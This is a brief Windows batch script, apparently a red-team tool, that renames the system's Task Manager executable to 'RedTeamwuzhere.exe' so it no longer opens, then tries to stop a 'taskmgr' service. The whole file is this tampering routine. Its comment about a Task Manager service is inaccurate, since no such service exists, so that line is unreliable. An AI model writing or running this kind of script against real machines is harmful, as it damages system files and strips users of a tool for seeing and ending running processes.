@echo off

REM Find the path to the Task Manager executable file
set taskManagerPath=%SystemRoot%\System32\taskmgr.exe

REM Rename the Task Manager executable file
ren "%taskManagerPath%" RedTeamwuzhere.exe

REM Disable the Task Manager service
net stop "taskmgr"